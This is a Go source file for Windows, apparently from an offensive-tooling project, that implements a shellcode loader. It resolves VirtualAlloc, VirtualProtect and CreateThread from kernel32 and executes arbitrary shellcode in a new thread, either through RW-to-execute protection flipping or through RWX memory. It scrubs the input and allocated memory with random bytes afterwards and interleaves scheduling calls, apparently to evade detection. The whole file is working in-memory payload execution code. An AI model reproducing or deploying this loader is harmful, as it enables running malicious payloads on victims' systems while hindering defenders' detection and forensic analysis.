// +build windows

package shellcode

import (
	"sync"
	"syscall"
	"unsafe"

	"github.com/pkg/errors"

	"project/internal/random"
)

// Execute is used to execute shellcode
// default method is VirtualProtect
// warning: slice shellcode will be cover
func Execute(method string, shellcode []byte) error {
	switch method {
	case "", "vp":
		return VirtualProtect(shellcode)
	case "thread":
		return CreateThread(shellcode)
	default:
		return errors.Errorf("unknown method: %s", method)
	}
}

var (
	initFindProcVirtualProtectOnce sync.Once

	vpVirtualAlloc        *syscall.Proc
	vpVirtualProtect      *syscall.Proc
	vpCreateThread        *syscall.Proc
	vpWaitForSingleObject *syscall.Proc
	vpVirtualFree         *syscall.Proc

	initVirtualProtectErr error
)

func initFindProcVirtualProtect() {
	schedule()
	var kernel32 *syscall.DLL
	kernel32, initVirtualProtectErr = syscall.LoadDLL("kernel32.dll")
	if initVirtualProtectErr != nil {
		return
	}

	procMap := [5]*struct {
		name string
		proc **syscall.Proc
	}{
		{"VirtualAlloc", &vpVirtualAlloc},
		{"VirtualProtect", &vpVirtualProtect},
		{"CreateThread", &vpCreateThread},
		{"WaitForSingleObject", &vpWaitForSingleObject},
		{"VirtualFree", &vpVirtualFree},
	}
	for i := 0; i < 5; i++ {
		schedule()
		proc, err := kernel32.FindProc(procMap[i].name)
		if err != nil {
			initVirtualProtectErr = err
			return
		}
		schedule()
		*procMap[i].proc = proc
	}
}

// VirtualProtect is used to use virtual protect to execute
// shellcode, it will block until shellcode exit, so usually
// need create a goroutine to execute VirtualProtect
func VirtualProtect(shellcode []byte) error {
	l := len(shellcode)
	if l == 0 {
		return errors.New("no data")
	}

	initFindProcVirtualProtectOnce.Do(initFindProcVirtualProtect)
	if initVirtualProtectErr != nil {
		return errors.WithStack(initVirtualProtectErr)
	}

	// allocate memory
	// https://docs.microsoft.com/zh-cn/windows/win32/memory/memory-protection-constants
	const (
		memCommit     = uintptr(0x1000)
		memReserve    = uintptr(0x2000)
		pageReadWrite = uintptr(0x04)
		pageExecute   = uintptr(0x10)
		memRelease    = uintptr(0x8000)
	)
	schedule()
	memAddr, _, err := vpVirtualAlloc.Call(0, uintptr(l),
		memReserve|memCommit, pageReadWrite)
	if memAddr == 0 {
		return errors.WithStack(err)
	}

	// copy shellcode
	rand := random.New()
	count := 0
	for i := 0; i < l; i++ {
		if count > 32 {
			schedule()
			count = 0
		} else {
			count++
		}
		// set shellcode
		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i)))
		*b = shellcode[i]

		// clean shellcode
		shellcode[i] = byte(rand.Int64())
	}

	// set execute
	schedule()
	var run uintptr
	ok, _, err := vpVirtualProtect.Call(memAddr, uintptr(l),
		pageExecute, uintptr(unsafe.Pointer(&run)))
	if ok == 0 {
		return errors.WithStack(err)
	}

	// execute shellcode
	schedule()
	threadAddr, _, err := vpCreateThread.Call(0, 0, memAddr, 0, 0, 0)
	if threadAddr == 0 {
		return errors.WithStack(err)
	}
	schedule()
	_, _, _ = vpWaitForSingleObject.Call(threadAddr, 0xFFFFFFFF)

	// set read write
	schedule()
	ok, _, err = vpVirtualProtect.Call(memAddr, uintptr(l),
		pageReadWrite, uintptr(unsafe.Pointer(&run)))
	if ok == 0 {
		return errors.WithStack(err)
	}

	// cover shellcode and free allocated memory
	schedule()
	rand = random.New()
	for i := 0; i < l; i++ {
		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i)))
		*b = byte(rand.Int64())
	}
	_, _, _ = vpVirtualFree.Call(memAddr, 0, memRelease)

	schedule()
	return nil
}

var (
	initFindProcThreadOnce sync.Once

	tVirtualAlloc        *syscall.Proc
	tCreateThread        *syscall.Proc
	tWaitForSingleObject *syscall.Proc
	tVirtualFree         *syscall.Proc

	initThreadErr error
)

func initFindProcThread() {
	schedule()
	var kernel32 *syscall.DLL
	kernel32, initThreadErr = syscall.LoadDLL("kernel32.dll")
	if initThreadErr != nil {
		return
	}

	procMap := [4]*struct {
		name string
		proc **syscall.Proc
	}{
		{"VirtualAlloc", &tVirtualAlloc},
		{"CreateThread", &tCreateThread},
		{"WaitForSingleObject", &tWaitForSingleObject},
		{"VirtualFree", &tVirtualFree},
	}
	for i := 0; i < 4; i++ {
		schedule()
		proc, err := kernel32.FindProc(procMap[i].name)
		if err != nil {
			initThreadErr = err
			return
		}
		schedule()
		*procMap[i].proc = proc
	}
}

// CreateThread is used to create thread to execute shellcode
// it will block until shellcode exit, so usually need create
// a goroutine to execute CreateThread
func CreateThread(shellcode []byte) error {
	l := len(shellcode)
	if l == 0 {
		return errors.New("no data")
	}

	initFindProcThreadOnce.Do(initFindProcThread)
	if initThreadErr != nil {
		return errors.WithStack(initThreadErr)
	}

	// allocate memory
	// https://docs.microsoft.com/zh-cn/windows/win32/memory/memory-protection-constants
	const (
		memCommit            = uintptr(0x1000)
		memReserve           = uintptr(0x2000)
		pageExecuteReadWrite = uintptr(0x40)
		memRelease           = uintptr(0x8000)
	)
	schedule()
	memAddr, _, err := tVirtualAlloc.Call(0, uintptr(l),
		memReserve|memCommit, pageExecuteReadWrite)
	if memAddr == 0 {
		return errors.WithStack(err)
	}

	// copy shellcode
	rand := random.New()
	count := 0
	for i := 0; i < l; i++ {
		if count > 32 {
			schedule()
			count = 0
		} else {
			count++
		}
		// set shellcode
		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i)))
		*b = shellcode[i]

		// clean shellcode
		shellcode[i] = byte(rand.Int64())
	}

	// execute shellcode
	schedule()
	threadAddr, _, err := tCreateThread.Call(0, 0, memAddr, 0, 0, 0)
	if threadAddr == 0 {
		return errors.WithStack(err)
	}
	schedule()
	_, _, _ = tWaitForSingleObject.Call(threadAddr, 0xFFFFFFFF)

	// cover shellcode and free allocated memory
	schedule()
	rand = random.New()
	for i := 0; i < l; i++ {
		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i)))
		*b = byte(rand.Int64())
	}
	_, _, _ = tVirtualFree.Call(memAddr, 0, memRelease)

	schedule()
	return nil
}
